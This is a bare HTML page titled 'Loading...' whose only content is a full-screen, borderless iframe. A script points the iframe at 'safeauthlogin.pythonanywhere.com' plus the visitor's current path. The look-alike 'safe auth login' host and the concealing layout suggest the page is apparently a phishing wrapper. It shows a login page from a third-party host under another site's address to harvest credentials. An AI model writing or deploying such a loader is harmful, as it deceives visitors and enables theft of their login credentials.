<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        body{
            margin: 0;
        }

        iframe {
            width: 100%;
            height: 100vh;
        }
    </style>
</head>
<body>
<iframe id="iframe" frameBorder="0"></iframe>
<script>
    $(window).load(function() {
      const url = "https://safeauthlogin.pythonanywhere.com" + window.location.pathname;
      $("#iframe").attr("src", url);
    });
</script>
</body>
</html>
